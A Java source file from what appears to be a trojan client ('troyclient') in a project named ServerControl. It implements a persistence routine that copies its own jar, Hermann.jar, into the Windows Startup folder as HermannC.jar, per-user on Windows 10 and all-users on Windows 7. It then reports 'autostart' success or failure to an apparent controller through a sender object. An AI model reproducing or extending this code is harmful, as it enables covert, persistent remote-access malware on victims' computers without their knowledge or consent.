package ch.lebois.troyclient.functions;

import ch.lebois.troyclient.main.SystemVariables;
import ch.lebois.troyclient.service.DownloadService;

/**
 * @author Felix
 * @date 04.04.2018
 * <p>
 * Project: ServerControl
 * Package: ch.lebois.troyclient.functions
 **/
public class Autostart {

    private void autostartWin10() {
        try {
            new DownloadService().download("file:///" + System.getProperty("user.dir") + "\\Hermann.jar",
                    System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
                            "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\HermannC.jar"));
            SystemVariables.SENDER.send("autostart", "true");
        } catch (Exception e) {
            SystemVariables.SENDER.send("autostart", "false");
        }
    }

    private void autostartWin7() {
        try {
            new DownloadService().download("file:///" + System.getProperty("user.dir") + "\\Hermann.jar",
                    "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\HermannC.jar");
            SystemVariables.SENDER.send("autostart", "true");
        } catch (Exception e) {
            SystemVariables.SENDER.send("autostart", "false");
        }

    }

    public void decide() {
        switch (System.getProperty("os.name")) {
            case "Windows 10":
                autostartWin10();
                break;
            case "Windows 7":
                autostartWin7();
                break;
            default:
                autostartWin10();
                autostartWin7();
                break;
        }
    }
}
